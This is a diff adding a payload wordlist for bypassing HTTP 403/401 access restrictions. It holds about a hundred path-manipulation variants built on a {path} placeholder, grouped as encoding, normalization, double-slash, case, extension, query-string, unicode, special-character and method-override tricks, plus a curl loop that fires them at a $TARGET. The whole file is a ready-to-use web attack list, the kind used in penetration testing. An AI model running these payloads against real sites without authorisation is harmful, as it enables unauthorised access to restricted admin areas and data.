@@ -1,0 +1,103 @@
+# 403/401 Bypass - Path Manipulation Payloads
+# Replace {path} with the restricted path (e.g., /admin)
+# Usage: for payload in $(cat 403_bypass.txt); do curl "$TARGET${payload/\{path\}/admin}"; done
+
+# URL encoding bypasses
+/%2e/{path}
+/{path}/%2e
+/%2e%2e/{path}
+/{path}/%2e%2e
+/{path}%00
+/{path}%00.json
+/{path}%20
+/{path}%09
+/{path}%0d%0a
+
+# Path normalization bypasses
+/{path}/
+/{path}/.
+/{path}/..
+/{path}/../{path}
+/{path}/./
+/./{path}
+/../{path}
+/.;/{path}
+/;/{path}
+/..;/{path}
+/{path}..;/
+/{path};/
+/{path}/;/
+
+# Double slash bypasses
+//{path}
+//{path}//
+///{path}
+/{path}//
+//{path}/./
+
+# Case variation bypasses
+/{PATH}
+/{Path}
+/{pAtH}
+/{path}
+
+# Extension bypasses
+/{path}.json
+/{path}.html
+/{path}.css
+/{path}.js
+/{path}.php
+/{path}.asp
+/{path}.aspx
+/{path}.xml
+/{path}.txt
+/{path}/index.html
+
+# Query string bypasses
+/{path}?
+/{path}??
+/{path}???
+/{path}?anything
+/{path}?x=y
+/{path}#
+/{path}#anything
+
+# Wildcard/glob bypasses
+/{path}/*
+/{path}/.
+/{path}/..
+
+# Unicode bypasses
+/{path}%c0%af
+/{path}%c1%9c
+/{path}%ef%bc%8f
+
+# HTTP/2 pseudo-header bypasses
+# Use with --http2 flag
+# :path: /{path}
+# :path: /../{path}
+
+# Verb tunneling (use with POST)
+# X-HTTP-Method: GET
+# X-HTTP-Method-Override: GET
+# X-Method-Override: GET
+
+# Special characters
+/{path}~
+/{path}`
+/{path}!
+/{path}@
+/{path}$
+/{path}^
+/{path}&
+/{path}*
+/{path}(
+/{path})
+/{path}+
+/{path}=
+/{path}|
+/{path}\
+/{path}[
+/{path}]
+/{path}{
+/{path}}
